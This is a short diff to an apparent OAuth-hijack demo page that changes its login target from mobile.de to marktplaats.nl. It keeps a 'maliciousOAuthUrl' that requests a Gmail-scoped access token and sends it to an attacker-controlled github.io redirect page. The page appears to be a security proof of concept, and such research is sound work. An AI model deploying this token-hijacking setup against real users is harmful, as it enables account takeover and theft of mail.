@@ -9,7 +9,7 @@
 
   <script>
     // ****** Replace with your login url ************
-    const loginTarget = "https://id.mobile.de/login?service=https%3A%2F%2Fid.mobile.de%2Foauth2.0%2FcallbackAuthorize%3Fclient_id%3Dmobile_web_DL1WJUPw%26redirect_uri%3Dhttps%253A%252F%252Fwww.mobile.de%252Fapi%252Fauth%252FloginCallback%253F%26response_type%3Dcode%26response_mode%3Dquery%26client_name%3DCasOAuthClient&lang=de&state=eyJybmQiOiJVRVRKN0NBVXJQTjh0dDRoaktDdWVSMXc1ZjdzdkpLS0FZR2VZSW1VVFBRIiwic3JjIjoiaHR0cHM6Ly93d3cubW9iaWxlLmRlLyJ9&nonce=99uLxNCzK7LwcdHRpwW1GxgONlor58wuOoTmOa8dGgk&scope=openid" 
+    const loginTarget = "https://www.marktplaats.nl/identity/v2/login" 
     const maliciousOAuthUrl = "https://accounts.google.com/o/oauth2/v2/auth?client_id=870583892774-o38qbckfb9vom8s7np3vqcb74cecjc3m.apps.googleusercontent.com&redirect_uri=https://zonia-bad.github.io/oauth-hijack-demo/redirect.html&response_type=token&scope=https%3A%2F%2Fmail.google.com%2F";
     function launch() {
       const win = window.open(loginTarget, "_blank", "width=900,height=700");
